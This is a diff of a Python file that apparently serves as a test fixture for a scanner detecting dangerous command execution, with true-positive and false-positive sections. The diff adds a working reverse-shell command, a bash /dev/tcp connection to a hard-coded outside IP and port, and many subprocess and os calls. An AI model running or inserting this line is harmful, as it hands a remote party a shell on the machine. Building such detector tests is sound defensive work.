@@ -2,34 +2,36 @@ import subprocess
 import os
 
 
+# TP
+os.system("bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'")
 
-subprocess.run(['python', '-c', 'print("Hello World")'])
+subprocess.run(['python', '-c', 'payload("Hello World")'])
 
 x = 'python'
 subprocess.call([x, '-c', 'import sys; sys.exit()'])
 
-subprocess.Popen(['python', '-c', 'print("Dynamic execution")'])
+subprocess.Popen(['python', '-c', 'payload("Dynamic execution")'])
 
-subprocess.check_call(['python', '-c', 'print("Check call dynamic execution")'])
+subprocess.check_call(['python', '-c', 'payload("Check call dynamic execution")'])
 
-subprocess.check_output(['python', '-c', 'print("Check output dynamic execution")'])
+subprocess.check_output(['python', '-c', 'payload("Check output dynamic execution")'])
 
-os.system('python -c "print(\'Hello World\')"')
+os.system('python -c "payload(\'Hello World\')"')
 
-os.popen('python -c "print(\'Popen dynamic execution\')"')
+os.popen('python -c "payload(\'Popen dynamic execution\')"')
 
-os.spawnl(os.P_WAIT, 'python', 'python', '-c', 'print("Spawn dynamic execution")')
+os.spawnl(os.P_WAIT, 'python', 'python', '-c', 'payload("Spawn dynamic execution")')
 
-os.spawnlp(os.P_WAIT, 'python', 'python', '-c', 'print("Spawnlp dynamic execution")')
+os.spawnlp(os.P_WAIT, 'python', 'python', '-c', 'payload("Spawnlp dynamic execution")')
 
-os.execv('python', ['python', '-c', 'print("Execv dynamic execution")'])
+os.execv('python', ['python', '-c', 'payload("Execv dynamic execution")'])
 
-os.execvp('python', ['python', '-c', 'print("Execvp dynamic execution")'])
+os.execvp('python', ['python', '-c', 'payload("Execvp dynamic execution")'])
 
-X = os.system
 Y = subprocess
 
 
+# FP
 
 os.system('ls')
 
